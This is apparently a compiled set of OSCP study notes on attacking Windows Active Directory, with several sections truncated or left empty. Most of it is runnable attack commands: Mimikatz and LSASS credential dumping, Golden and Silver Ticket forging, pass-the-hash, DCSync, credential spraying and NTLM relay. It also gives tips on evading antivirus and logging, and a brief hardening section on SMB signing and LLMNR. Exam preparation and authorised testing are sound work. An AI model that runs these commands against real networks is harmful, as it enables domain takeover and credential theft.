docs.title: Takeaway From the reports I found
Takeaway #1: Enumerate Versions, Not Just Ports. Don't just find open doors; find out exactly what kind of door it is. Use scan options like nmap -sV to aggressively probe for service versions.

Takeaway #2: Use searchsploit First, but Master Google Fu. Your local searchsploit is the quickest way to find public exploits. If that fails, use precise Google searches (e.g., "vsftpd 2.3.4" exploit PoC github") to find less-official, but potentially working, code.

Takeaway #3: Never Run Public Exploits Blindly. Always read the source code of an exploit before running it. Understand how it works, what it does to the target, and what you need to modify (like IP addresses and ports) for it to work correctly.

docs.title: NetBIOS (Network Basic Input/Output System)
docs.text:
Purpose

Allows applications on separate computers to communicate over a LAN.

Ports:

Port Protocol Service 137 UDP/TCP Name service for registration and resolution 138 UDP Datagram distribution service (connectionless) 139 TCP Session service (connection-oriented)

Enumeration Value

Can reveal domain names, workgroup names, system names, and MAC addresses.

docs.title: SMB (Server Message Block)
docs.text:
Purpose

A network file sharing protocol for shared access to files, directories, printers, and other network resources.

Ports:

  • 445/tcp - Modern SMB running directly over TCP/IP
  • 139/tcp - Legacy SMB running with NetBIOS over TCP/IP

Default Administrative Shares:

Share Purpose ADMIN$ Remote administration C$ Access to the root of the C: drive volume IPC$ Inter-Process Communication - shares named pipes NETLOGON Stores logon scripts (Domain Controllers) SYSVOL Stores group policy and replicated files (Domain Controllers)

docs.title: MSRPC (Microsoft Remote Procedure Call)
docs.text:
Purpose

A protocol used by a client to request a service from a program on a remote server as if it were a local call. Backbone for most remote Windows administration.

Port: TCP/UDP 135 (RPC Endpoint Mapper)

MSRPC Over SMB (Named Pipes):

Named Pipe Service Capabilities \pipe\lsarpc Local Security Authority (LSA) Enumerate SIDs, policies, trust relationships \pipe\samr Local SAM Database Enumerate domain/local users and groups \pipe\svcctl Service Control Manager Remotely manage services \pipe\atsvc Task Scheduler Remotely manage scheduled tasks \pipe\winreg Remote Registry Service Access remote registry

docs.title: AS-REP Roasting Attacks
docs.text:
Attack Overview

Targets users with Kerberos pre-authentication disabled, allowing offline password cracking.

docs.title: Understanding the Attack
docs.text:
Kerberos Pre-Authentication:

  • Default security feature requiring users to prove password knowledge
  • Attacker can request authentication data without a password if disabled
  • KDC returns encrypted TGT (AS-REP message) encrypted with user's NTLM hash

Goal: Capture AS-REP hash and crack it offline.

docs.text:
Use Case

After gaining SYSTEM-level access where a privileged domain user has an active session.

docs.title: Understanding Access Tokens
docs.text:
Access Tokens:

  • Generated upon successful authentication
  • Identify user, groups, and privileges
  • Stored by LSASS until system restart

Delegation Tokens:

  • Created from interactive logons (RDP, physical)
  • Primary targets for impersonation

docs.title: A. Golden Ticket Attack
docs.text:
Impact

Complete and persistent control over entire domain.

What is it?

Forged Ticket-Granting Ticket (TGT) allowing authentication as any user with any privileges.

Prerequisites

  • Domain Admin privileges on DC
  • krbtgt account's NTLM hash
  • Domain Name
  • Domain SID

docs.title: Step 1: Gather Required Information
docs.text:
privilege::debug
lsadump::lsa /inject /name:krbtgt

Note

Dumps krbtgt account details including NTLM hash and Domain SID.

docs.title: Step 2: Forge and Inject the Golden Ticket
docs.text:
kerberos::golden /user:<SPOOFED_USERNAME> /domain:<DOMAIN_NAME> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTHASH> /id:500 /ptt

Parameters:

Parameter Description /user Any name, even non-existent (Administrator is common) /id RID of user to impersonate (500 = default Administrator) /ptt Inject ticket directly into current session

docs.title: Step 3: Use the Ticket
docs.text:
Spawn CMDAccess SharesGet SYSTEM Shell

dir \\<OTHER_HOST>\C$

.\PsExec64.exe -accepteula \\<OTHER_HOST> -s cmd

docs.text:

# Forge ticket

# Use ticket

docs.title: B. Silver Ticket Attack
docs.text:
Overview

Forged Ticket-Granting Service (TGS) ticket limited to specific service on specific server. Stealthier than Golden Ticket.

Prerequisites

  • Admin/SYSTEM privileges on target server
  • NTLM hash of service account (e.g., HOSTNAME$)
  • Service Principal Name (SPN)
  • Domain Name and Domain SID

docs.title: Step 1: Gather Required Information
docs.text:
• Obtain service account hash (dump LSASS on target)
  • Get domain SID: wmic useraccount get name,sid

docs.title: Step 2: Forge and Inject Silver Ticket
docs.text:

Note

This example forges a ticket for CIFS (file share) service.

docs.title: Step 3: Use the Ticket

docs.title: OSCP Assume Breach Scenario - Complete Cheatsheet
Overview
docs.text: In an "assume breach" scenario, you are given initial access (credentials or foothold) and must escalate privileges and move laterally through the Active Directory environment. This cheatsheet provides a systematic approach for OSCP exam success.

docs.title: What You're Given
docs.text:
• [ ] Username and password
  • [ ] NTLM hash
  • [ ] Initial shell access
  • [ ] VPN credentials
  • [ ] Target IP range
  • [ ] Domain name

docs.title: Step 1.1: Verify Credentials Work
docs.text:
# Test with CrackMapExec
crackmapexec smb <TARGET_IP> -u <username> -p <password>
crackmapexec smb <TARGET_IP> -u <username> -H <NTLM_HASH>

# Test SSH (if available)
ssh user@target

# Test RDP (if available)
xfreerdp /v:<TARGET_IP> /u:<username> /p:<password>

# Test WinRM
evil-winrm -i <TARGET_IP> -u <username> -p <password>

Success Criteria: 

[+] indicates success
Pwn3d! indicates admin access

docs.title: Step 1.2: Identify Your Access Level
docs.text:
# Check where you have access
crackmapexec smb <IP_RANGE> -u <username> -p <password>

# Example
crackmapexec smb 192.168.1.0/24 -u john -p Password123

docs.title: Step 1.3: Document Initial Access
docs.text:
Access Type: [ ] SMB [ ] SSH [ ] RDP [ ] WinRM
Admin Access: [ ] Yes [ ] No
Systems Accessible: ___________________

docs.title: Step 2.1: Network Discovery
docs.text:
# Scan network
nmap -sn <IP_RANGE>
nmap -p 88,135,139,389,445,636,3268,3269,3389,5985 <IP_RANGE>

# Identify Domain Controller
nmap -p 88,389 --open <IP_RANGE>

docs.title: Step 2.2: Domain Enumeration
docs.text:
Find Domain Controllers: 

# Using nslookup
nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>

# Using CrackMapExec
crackmapexec smb <IP_RANGE> --gen-relay-list targets.txt

# Using nmap
nmap -p 389 --script ldap-rootdse <TARGET_IP>

Get Domain Information: 

# Using rpcclient
rpcclient -U <username>%<password> <DC_IP>
rpcclient> querydominfo
rpcclient> enumdomusers
rpcclient> enumdomgroups

docs.title: Step 2.3: User Enumeration
docs.text:
# Get user list
crackmapexec smb <DC_IP> -u <username> -p <password> --users

# Using ldapsearch
ldapsearch -x -H ldap://<DC_IP> -D '<username>@<domain>' -w '<password>' -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

# Using windapsearch
windapsearch.py -d <domain> -u <username> -p <password> --dc-ip <DC_IP> -U

docs.title: Step 2.4: Group Enumeration
docs.text:
# Important groups to check
crackmapexec smb <DC_IP> -u <username> -p <password> --groups

# Specifically check for:
# - Domain Admins
# - Enterprise Admins
# - Administrators
# - Remote Desktop Users
# - Remote Management Users

docs.title: Step 3.1: Choose Access Method
docs.text:
If you have credentials:

# Option 1: Evil-WinRM (if port 5985/5986 open)
evil-winrm -i <TARGET_IP> -u <username> -p <password>

# Option 2: PsExec
impacket-psexec <DOMAIN>/<username>:<password>@<TARGET_IP>

# Option 3: WMIExec (stealthier)
impacket-wmiexec <DOMAIN>/<username>:<password>@<TARGET_IP>

# Option 4: RDP
xfreerdp /v:<TARGET_IP> /u:<username> /p:<password>

If you have NTLM hash:

# Pass-the-Hash with PsExec
impacket-psexec -hashes :<NTLM_HASH> <DOMAIN>/<username>@<TARGET_IP>

# Pass-the-Hash with WMIExec
impacket-wmiexec -hashes :<NTLM_HASH> <DOMAIN>/<username>@<TARGET_IP>

# Pass-the-Hash with Evil-WinRM
evil-winrm -i <TARGET_IP> -u <username> -H <NTLM_HASH>

docs.title: Step 3.2: Stabilize Shell
docs.text:
# Check current user
whoami
whoami /groups
whoami /priv

# Check system info
systeminfo
hostname
ipconfig /all

# Check domain
echo %USERDOMAIN%
echo %LOGONSERVER%

docs.title: Step 4.1: Local Credentials
docs.text:
If you have admin access:

# Run Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > creds.txt

# View output
type creds.txt | findstr /i "username password ntlm"

# Dump SAM
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit" > sam.txt

Alternative: Dump LSASS

# Find LSASS PID
tasklist | findstr lsass

# Dump LSASS (as admin)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\temp\lsass.dmp full

# Transfer to Kali and parse
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

docs.title: Step 4.2: Remote Credential Dumping
docs.text:
# Dump credentials from multiple machines
crackmapexec smb <IP_RANGE> -u <username> -p <password> --sam
crackmapexec smb <IP_RANGE> -u <username> -p <password> --lsa

# Using secretsdump
impacket-secretsdump <DOMAIN>/<username>:<password>@<TARGET_IP>

docs.title: Step 4.3: Analyze Credentials
docs.text:
# Create credential database
cat creds.txt | grep -i "username\|password\|ntlm" > analyzed_creds.txt

# Test all found credentials
for user in $(cat users.txt); do
    crackmapexec smb <DC_IP> -u $user -p <password>
done

docs.title: Step 5.1: Identify High-Value Targets
docs.text:
# Find Domain Admins
net group "Domain Admins" /domain

# Find computers
net group "Domain Computers" /domain

# Using PowerView (if available)
Get-NetComputer
Get-NetUser -AdminCount
Get-NetGroup -AdminCount

docs.title: Step 5.2: Test Credentials Everywhere
docs.text:
# Spray credentials across network
crackmapexec smb <IP_RANGE> -u <username> -p <password>
crackmapexec smb <IP_RANGE> -u <username> -H <NTLM_HASH>

# Try with all found credentials
crackmapexec smb <IP_RANGE> -u users.txt -p passwords.txt

docs.title: Step 5.3: Move Laterally
docs.text:
# Once you find admin access, move to that system
impacket-wmiexec <DOMAIN>/<username>:<password>@<NEW_TARGET>

# Dump credentials on new system
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Repeat until you find Domain Admin credentials

docs.title: Step 6.1: Verify Domain Admin Access
docs.text:
# Check if you have DA credentials
net user <username> /domain
net group "Domain Admins" /domain

# Test DA access to DC
crackmapexec smb <DC_IP> -u <DA_username> -p <password>

docs.title: Step 6.2: Access Domain Controller
docs.text:
# Get shell on DC
impacket-psexec <DOMAIN>/<DA_username>:<password>@<DC_IP>

# Or use WMI
impacket-wmiexec <DOMAIN>/<DA_username>:<password>@<DC_IP>

# Or use Evil-WinRM
evil-winrm -i <DC_IP> -u <DA_username> -p <password>

docs.title: Step 6.3: DCSync (Alternative)
docs.text:
# If you have DCSync rights, extract all hashes without DC access
impacket-secretsdump <DOMAIN>/<username>:<password>@<DC_IP> -just-dc

# Dump krbtgt for Golden Ticket
impacket-secretsdump <DOMAIN>/<username>:<password>@<DC_IP> -just-dc-user krbtgt

docs.title: Step 6.4: Extract All Credentials
docs.text:
# On DC, dump NTDS.dit
mimikatz.exe "lsadump::dcsync /domain:<domain> /all /csv" "exit" > all_hashes.txt

# Or using secretsdump
impacket-secretsdump <DOMAIN>/<DA_username>:<password>@<DC_IP> -just-dc -outputfile hashes

docs.title: Golden Ticket
docs.text:
# Get domain SID
mimikatz.exe "lsadump::lsa /patch" "exit" | findstr "Domain SID"

# Get krbtgt hash
mimikatz.exe "lsadump::dcsync /user:krbtgt" "exit" | findstr "Hash NTLM"

# Create Golden Ticket
mimikatz.exe "kerberos::golden /user:Administrator /domain:<domain> /sid:<SID> /krbtgt:<HASH> /id:500 /ptt" "exit"

# Verify
klist
dir \\DC01\C$

docs.title: What to Document
docs.text:
1. Initial Credentials
   - Username: _____________

2. Discovered Credentials
   User | Password | Hash | System Found | Access Level
   -----|----------|------|--------------|-------------

3. Lateral Movement Path

   Evidence: Screenshots/command output

4. Domain Admin Access

docs.title: Stuck at Initial Access
docs.text:
Problem: Credentials don't work 

# Verify credentials are correct
echo "Username: <username>"
echo "Password: <password>"

# Try different formats
<username>@<domain>
<domain>\<username>
<username>

# Try different services
- SMB (445)
- WinRM (5985/5986)
- RDP (3389)
- SSH (22)

Problem: No admin access anywhere 

# Enumerate more systems
nmap -sn <LARGER_RANGE>

# Try password spraying
crackmapexec smb <IP_RANGE> -u <username> -p <password> --continue-on-success

# Look for web applications
# Check for file shares with sensitive info

docs.title: Stuck at Privilege Escalation
docs.text:
Problem: Can't find Domain Admin credentials 

# Check more systems
# DA might be logged in somewhere

# Enumerate logged-on users
crackmapexec smb <IP_RANGE> -u <username> -p <password> --loggedon-users

# Look for service accounts
# Service accounts often have high privileges

# Check for cached credentials
mimikatz.exe "lsadump::cache" "exit"

# Look for stored credentials
cmdkey /list

Problem: Mimikatz blocked by AV 

# Alternative 1: Dump LSASS manually
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full

# Alternative 2: Use secretsdump remotely
impacket-secretsdump <DOMAIN>/<username>:<password>@<TARGET>

# Alternative 3: Extract registry hives
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
# Parse offline with secretsdump

docs.title: Stuck at Lateral Movement
docs.text:
Problem: Found credentials but can't move laterally 

# Verify the credentials work
crackmapexec smb <TARGET> -u <user> -p <pass>

# Try different methods
- PsExec (noisy but reliable)
- WMIExec (stealthier)
- Evil-WinRM (if WinRM enabled)
- RDP (if allowed)

# Check firewall rules
# Port 445 must be open for most methods

Problem: Access denied on everything 

# User might be standard user
# Look for:
- Writable shares
- Scheduled tasks you can modify
- Services you can restart
- GPO abuse opportunities
- Kerberoastable accounts

docs.title: Stuck at Domain Compromise
docs.text:
Problem: Can't access Domain Controller 

# Verify you have Domain Admin credentials
net group "Domain Admins" <username> /domain

# Try different access methods
impacket-psexec <DOMAIN>/<DA>:<pass>@<DC>
impacket-wmiexec <DOMAIN>/<DA>:<pass>@<DC>
evil-winrm -i <DC> -u <DA> -p <pass>

# Check if DC is firewalled
nmap -p 445,5985,3389 <DC_IP>

# Try DCSync instead (remote)
impacket-secretsdump <DOMAIN>/<DA>:<pass>@<DC> -just-dc

Problem: Don't have Domain Admin 

# Review what you have
1. List all credentials found
2. List all systems accessed
3. List all group memberships

# Look for:
- Service accounts with high privileges
- Users in "Account Operators" or similar
- Systems where DAs are logged in
- Kerberoastable accounts
- AS-REP Roastable accounts

docs.title: General Troubleshooting
docs.text:
Take a Step Back (15 min break) 

1. Review your notes
2. List what you have:
   - Credentials
   - Systems accessed
   - Groups discovered
   - Services identified
3. List what you need:
   - Domain Admin access
   - Access to DC
4. Identify the gap
5. Focus on bridging that gap

Re-enumerate Everything 

# Sometimes you miss things first time

# Re-run user enumeration
crackmapexec smb <DC> -u <user> -p <pass> --users > users_new.txt

# Re-run computer enumeration  
crackmapexec smb <DC> -u <user> -p <pass> --computers > computers_new.txt

# Re-scan network
nmap -p- <IP_RANGE>

docs.title: Quick Reference Flowchart
docs.text:
Start: Given Credentials
   ↓
1. Verify Credentials Work
   ↓
2. Enumerate Domain (Users/Groups/Computers)
   ↓
3. Get Shell on Accessible System
   ↓
4. Run Mimikatz / Dump Credentials
   ↓
5. Find New Credentials?
   Yes → Test Everywhere → Repeat from Step 3
   No → Try Different System → Repeat from Step 3
   ↓
6. Found Domain Admin?
   Yes → Access DC → Dump NTDS.dit → DONE
   No → Continue Lateral Movement
   ↓
7. If Stuck: Re-enumerate, Try DCSync, Check Service Accounts

Priority Actions: 

1. Dump credentials on EVERY system you access
2. Test EVERY credential on DC immediately
3. Focus on finding Domain Admin
4. Try DCSync if you have any elevated account
5. Document as you go, not at the end

docs.title: Pro Tips
docs.text:
Success Tips

  • Document everything as you go
  • Test credentials immediately after finding them
  • Try credentials everywhere - reuse is common
  • Save Mimikatz output - you'll need it later
  • Take screenshots of key findings
  • Note timestamps of when you found what

Efficiency Tips

  • Start Mimikatz early - get credentials ASAP
  • Spray credentials across all systems
  • Focus on Domain Admin - that's the goal
  • Use CrackMapExec for bulk operations
  • Script repetitive tasks

Common Mistakes

  • Not testing credentials on DC immediately
  • Forgetting to dump credentials on each system
  • Not documenting the lateral movement path
  • Spending too long on one approach
  • Not trying DCSync when stuck
  • Missing obvious Domain Admin logged in somewhere

OSCP Exam

  • Time management is critical
  • Document for the report as you go
  • Screenshot every major step
  • Note the path: Initial → System A → System B → DC
  • Explain how you got DA
  • Show command output in report

docs.title: Checklist for Completion
docs.text:
• [ ] Initial credentials verified
  • [ ] Domain enumerated (users, groups, computers)
  • [ ] Shell obtained on at least one system
  • [ ] Local credentials dumped
  • [ ] Lateral movement performed

docs.title: Pro Tips
docs.text:
Exam Tips

  • Always try multiple methods - one might work when others fail
  • PsExec is reliable but noisy - use first to verify access
  • WMIExec is stealthier - good for avoiding detection
  • Evil-WinRM is great if WinRM (5985/5986) is open
  • Document all credentials and where you found them
  • Test credentials immediately after obtaining them
  • Pivot systematically - document your path through network

Credential Reuse

  • Try credentials everywhere - admins reuse passwords
  • Local admin hash often works on multiple machines
  • Domain credentials work across entire domain
  • Service accounts often have access to many systems
  • Use CrackMapExec to spray credentials across network

Stealth Considerations

  • PsExec creates a service (logged)
  • WMI is stealthier, no service creation
  • DCOM is very stealthy
  • Scheduled tasks leave logs but work well
  • WinRM is legitimate admin traffic

Common Mistakes

  • Not trying multiple lateral movement methods
  • Forgetting to check if WinRM is enabled
  • Not documenting successful lateral moves
  • Using wrong credential format (domain\user vs user@domain)
  • Not cleaning up services/tasks after use
  • Forgetting to URL-encode special characters in passwords

Restrictions

  • Document all lateral movement in your report
  • Note which credentials worked on which systems
  • Show the path of compromise (A → B → C → DC)
  • Include screenshots of successful access
  • Don't use automated exploitation beyond manual tools

docs.title: Common Issues
docs.text:
1. "Access Denied" 

# User doesn't have admin rights on target
# Try different user or check group membership
net user username /domain

2. "Cannot connect to target" 

# Firewall blocking
# Try different method (WMI vs PsExec)
# Check if service is running

3. "Authentication Failed" 

# Wrong credentials
# Try different credential format
# Check domain name is correct

4. WinRM "Access Denied" 

# User not in "Remote Management Users" group
# Try: net localgroup "Remote Management Users" username /add

5. Hash not working 

# Restricted Admin mode disabled for RDP
# Use different method (PSExec, WMI)
# Ensure using correct hash format (NTLM only, no LM)

docs.text:

# Look for "Domain SID"

docs.title: Pro Tips
docs.text:
Exam Tips

  • Run Mimikatz immediately after gaining admin access
  • Save all output to files for later reference
  • Extract both passwords and NTLM hashes
  • Try Pass-the-Hash if you can't crack hashes
  • Look for Domain Admin credentials in memory
  • Document all credentials with timestamps
  • DCSync if you have the rights - fastest way to get all hashes

Stealth Tips

  • Use one-liners for quick execution
  • Delete Mimikatz binary after use
  • Use in-memory execution (Invoke-Mimikatz)
  • Dump LSASS to file and parse offline
  • Avoid skeleton key (very noisy)

Common Mistakes

  • Not running privilege::debug first
  • Forgetting to elevate token for SAM/secrets
  • Not saving output (Mimikatz output scrolls fast)
  • Using wrong domain SID for Golden Ticket
  • Not verifying tickets with klist after PTT
  • Forgetting to purge old tickets before PTT

Restrictions

  • Don't use automated AD exploitation tools beyond scope
  • Document your methodology clearly
  • Note all credentials found with context
  • Explain privilege escalation path in report
  • Show screenshots of successful exploitation

docs.title: Overview
docs.text: NTLM Relay attacks exploit the NTLM authentication protocol by intercepting and relaying authentication requests to target systems. This allows attackers to authenticate as legitimate users without knowing their passwords.

docs.title: Required Tools
docs.text:
• Responder - LLMNR/NBT-NS/MDNS poisoner
  • ntlmrelayx (Impacket) - NTLM relay tool
  • Proxychains (optional) - For pivoting
  • CrackMapExec - Post-exploitation and verification
  • mitm6 - IPv6 DHCP spoofing for relay

docs.title: What is NTLM Relay?
docs.text:
NTLM Relay works by:

  1. Intercepting authentication attempts (via LLMNR/NBT-NS poisoning or mitm6)
  2. Relaying those credentials to target systems
  3. Authenticating to services on behalf of the victim
  4. Executing commands or dumping credentials

docs.title: Requirements for Success
docs.text: ✅ SMB Signing must be disabled or not required on target ✅ Valid network credentials being relayed ✅ Relayed user must have admin rights on target (for most attacks) ✅ Network connectivity between attacker and targets

docs.title: Common Attack Scenarios
docs.text:
1. SMB to SMB - Relay SMB auth to another SMB service
  2. HTTP to SMB - Relay HTTP auth to SMB
  3. LDAP to LDAP - Relay to domain controller LDAP
  4. SMB to LDAPS - Relay to secure LDAP for DCSync

docs.title: Step 1: Identify Targets Without SMB Signing
docs.text:
Using CrackMapExec: 

crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

Using Nmap: 

nmap --script smb-security-mode.nse -p445 192.168.1.0/24
nmap --script smb2-security-mode.nse -p445 192.168.1.0/24

Manual Check with Nmap: 

nmap -p445 --script smb-security-mode 192.168.1.100

Look for: 

| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   message_signing: disabled (dangerous, but default)

docs.title: Step 2: Identify Domain Controllers
docs.text:
# Using CrackMapExec
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

# Using Nmap

docs.title: Common Issues
docs.text:
1. "SMB Signing is required" 

Solution: Target doesn't support relay, try different targets

2. "Access Denied" 

Solution: Relayed user doesn't have admin rights on target
Try different targets or wait for different user

3. "Connection Timeout" 

Solution: Check network connectivity and firewall rules
Verify targets are online: nmap -Pn -p445 <target>

4. "Responder not capturing hashes" 

Solution:
- Verify SMB/HTTP are OFF in Responder.conf
- Check interface: ip addr show
- Ensure you're on the correct network segment

5. "ntlmrelayx not relaying" 

Solution:
- Verify SMB2 support: --smb2support
- Check targets list is valid
- Ensure Responder is running first

docs.title: Enable SMB Signing
docs.text:
Via Group Policy: 

Computer Configuration -> Policies -> Windows Settings -> 
Security Settings -> Local Policies -> Security Options

Set:
- "Microsoft network client: Digitally sign communications (always)" = Enabled
- "Microsoft network server: Digitally sign communications (always)" = Enabled

Via Registry: 

Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters" `
  -Name "RequireSecuritySignature" -Value 1

docs.title: Disable LLMNR and NBT-NS
docs.text:
Disable LLMNR via Group Policy: 

Computer Configuration -> Administrative Templates -> 
Network -> DNS Client -> Turn off multicast name resolution = Enabled

Disable NBT-NS: 

$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration
$adapters | ForEach-Object { $_.SetTcpipNetbios(2) }

docs.text:

Computer Configuration -> Policies -> Windows Settings -> 
Security Settings -> Local Policies -> Security Options

"Domain controller: LDAP server signing requirements" = Require signing

Important

  • NTLM Relay attacks are time-dependent - be patient
  • Always check SMB signing status first

Pro Tips

  • Always try LDAPS relay to DC if possible - can grant DCSync rights

docs.title: Foundational Security Concepts
docs.text:
Essential Background Knowledge

Understanding these concepts is critical before attempting any privilege escalation attacks. These explain the "why" behind the techniques.

docs.title: Understanding Security Identifiers (SID)
docs.text:
Windows uses SIDs rather than usernames for all security decisions. Each user and group has a unique SID that defines their security context.

Your objective is to obtain an access token associated with a privileged SID.

Important SID Values

  • S-1-5-...-500: Local Administrator account
  • S-1-5-18: NT AUTHORITY\SYSTEM (highest privilege level - primary target)
  • S-1-5-11: Authenticated Users group
  • RID > 1000: Regular user accounts and custom groups

docs.title: Access Tokens & Integrity Levels
docs.text:
When you authenticate, Windows creates an access token containing your SID, group memberships, and assigned privileges. All processes you launch inherit this token.

Mandatory Integrity Control (MIC) ranks processes by trustworthiness:

Level Description Low Sandboxed environments (browser tabs, untrusted processes) Medium Standard user context - your typical starting point High Administrator context - initial escalation target System Kernel and critical system services

Critical Restriction

Lower integrity processes cannot modify higher integrity objects, regardless of file permissions. Escalation requires moving from Medium → High → System.

docs.title: User Account Control (UAC) Mechanism
docs.text:
UAC splits administrator privileges into two separate tokens:

  • Standard token (Medium integrity) - used by default for routine operations
  • Privileged token (High integrity) - requires UAC prompt approval

Many privilege escalation techniques focus on bypassing the UAC prompt to access the privileged token without user interaction.

docs.title: Initial System Reconnaissance
docs.text:
Start Here

Complete this reconnaissance immediately after gaining initial access. Never begin exploitation without this intelligence.

Primary Objectives

Map the system landscape, identify user accounts, understand the machine's role, and locate potential attack vectors.

docs.title: Current User Context
docs.text:
Identify your active user and hostname:

whoami

Key Information:

  • hostname\username: Current security context
  • hostname: Machine identifier (often reveals purpose: DB-SERVER, WEB-01, DC-PRIMARY)

docs.title: Privilege & Group Enumeration
docs.text:
Determine group memberships and integrity level:

whoami /groups

Critical Group Memberships:

  • BUILTIN\Administrators: Full administrative access (rare initially)
  • BUILTIN\Remote Desktop Users: RDP access capability
  • BUILTIN\Backup Operators: Read/write access bypassing ACLs
  • Custom groups: IT-Support, Helpdesk, PowerUsers may have elevated permissions

Integrity Check: Confirm Mandatory Label\Medium Mandatory Level indicates standard user requiring escalation.

docs.title: User & Group Discovery
docs.text:
Enumerate all accounts to identify high-value targets:

CMDPowerShell 
net user
net localgroup
net localgroup administrators

Get-LocalUser
Get-LocalGroup

Target Identification:

  • Administrative accounts: sysadmin, backupadmin, john.admin
  • Administrator group members - highest priority targets
  • Status of default Administrator account (enabled/disabled)

docs.title: System Information Gathering
docs.text:
Extract OS details, architecture, and patch status:

Critical Data Points:

Field Usage Example OS Name Version identification Microsoft Windows Server 2019 Standard OS Version Exploit matching 10.0.17763 Build 17763 System Type Payload architecture x64-based PC Hotfixes Missing patch analysis Use with windows-exploit-suggester

docs.text:

ipconfig /all

netstat Analysis Points

  • LISTENING: Local services (:3389 RDP, :445 SMB, :5985 WinRM)
  • ESTABLISHED: Active sessions - credentials may be in memory
  • PID: Cross-reference with process names using tasklist

docs.text:

# 64-bit applications
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# 32-bit applications

  • Outdated software: Legacy browsers, unpatched utilities
  • Security tools: Password managers (KeePass, LastPass)
  • Development tools: XAMPP, WAMP, local databases
  • Match PIDs from netstat to identify service owners

docs.title: Credential Hunting Techniques
docs.text:
Execution Timing

Begin after completing initial reconnaissance. Use discovered information (installed software, usernames) to guide your search patterns.

Mission Objective

Locate plaintext credentials, API keys, or configuration secrets enabling lateral movement or direct privilege escalation.

docs.title: Filesystem Credential Search
docs.text:
Systematically search for files containing sensitive data, focusing on application directories and user spaces.

PowerShell Recursive Search:

Get-ChildItem -Path [START_DIRECTORY] -Include [FILE_TYPES] -File -Recurse -ErrorAction SilentlyContinue

Parameter Breakdown:

Parameter Purpose -Path Search starting point: C:\, C:\Users\alice\Desktop -Include Target patterns: *.txt,*.xml,*.config,*.ini -Recurse Traverse all subdirectories -ErrorAction SilentlyContinue Suppress access denied errors

High-Value Locations:

  • User directories: C:\Users\, C:\Users\Public\
  • User data: Desktop, Documents, Downloads folders
  • Application data: C:\Program Files\, C:\ProgramData\
  • Web roots: C:\inetpub\wwwroot\, C:\xampp\htdocs\

Target File Types:

Category Examples Password Databases *.kdbx, passwords.txt, credentials.txt Configuration web.config, app.config, *.ini, database.xml Documents *.docx, *.xlsx - onboarding guides, IT procedures Scripts *.ps1, *.bat, *.vbs - automation with hardcoded credentials

Reading Discovered Files:

CMDPowerShell 
type C:\path\to\file.txt

cat C:\path\to\file.txt

docs.title: Credential Exploitation
docs.text:
Once credentials are discovered, verify the account and determine access methods.

Validation Process:

  1. Locate credential pair - Example: username: robert / password: P@ssw0rd2024!#

  2. Verify account exists and check permissions:

    net user robert

  3. Determine access method based on group membership:

    Remote Desktop Access (Remote Desktop Users group):

    xfreerdp /v:192.168.1.50 /u:robert /p:'P@ssw0rd2024!#'

    PowerShell Remoting (Remote Management Users group):

    evil-winrm -i 192.168.1.50 -u robert -p 'P@ssw0rd2024!#'

    Local Administrator (no remote access):

    From an existing GUI session, escalate privileges:

    runas /user:adminaccount cmd

    Enter password when prompted for elevated command prompt.

docs.title: Iterative Enumeration Cycle
docs.text:
Critical Concept

After successfully switching users, restart the entire enumeration process with the new security context.

Rationale: Different users have different file permissions. Previously inaccessible files may now be readable.

Real-World Scenario

User alice received "Access Denied" on database.xml. After RDP access as robert, the file was readable and contained dbadmin credentials, leading to complete system compromise.

Core Principle

Every new user context is a new opportunity. Never assume enumeration is complete.

docs.title: PowerShell Artifact Analysis
docs.text:
Timing & Context

Execute during enumeration after filesystem searches. Administrator PowerShell usage often leaves exploitable artifacts due to poor operational security.

Strategic Goal

Extract credentials and sensitive data from PowerShell's persistent logging mechanisms that administrators assume are cleared or invisible.

docs.title: PSReadLine History Exploitation
docs.text:
Target the persistent history file, not the ephemeral session history.

Common Administrator Misconception

Get-History only shows current session data. Running Clear-History does NOT remove the persistent file.

Persistent History Reality: The PSReadLine module maintains a complete command history across sessions and reboots, surviving Clear-History attempts.

One-Line Extraction:

type ((Get-PSReadlineOption).HistorySavePath)

Standard Location

C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

High-Value Artifacts:

  • Plaintext credentials: $pass = "MyS3cr3tP@ss", ConvertTo-SecureString "admin123"
  • PSCredential construction: New-Object System.Management.Automation.PSCredential
  • Remote connections: Enter-PSSession, Invoke-Command with inline credentials
  • Transcript activation: Start-Transcript -Path "C:\Logs\session.txt" reveals additional log locations

docs.title: PowerShell Transcript Discovery
docs.text:
Transcripts provide complete session recordings - every command and all output. The ultimate intelligence source.

Discovery Methods:

  1. Direct reference - Check PSReadLine history for Start-Transcript commands showing exact paths

  2. Filesystem sweep:

    Get-ChildItem -Path C:\ -Include *transcript*.txt -File -Recurse -ErrorAction SilentlyContinue

Critical Intelligence (Jackpot Scenarios):

Transcripts capture complete PSCredential object creation that may be sanitized in history files.

Transcript Gold Mine

**********************
PS> $secpass = ConvertTo-SecureString "SuperSecure2024!" -AsPlainText -Force
PS> $credential = New-Object System.Management.Automation.PSCredential("adminuser", $secpass)
PS> Enter-PSSession -ComputerName SRV-FILE01 -Credential $credential
**********************

Result: Direct access to adminuser account with password SuperSecure2024!

docs.title: WinRM Credential Exploitation
docs.text:
Leverage discovered credentials for remote access via Windows Remote Management.

Detection Indicator

Presence of Enter-PSSession or Invoke-Command in logs indicates WinRM is active and accessible.

Tool Selection: evil-winrm from Kali Linux

Connection Syntax:

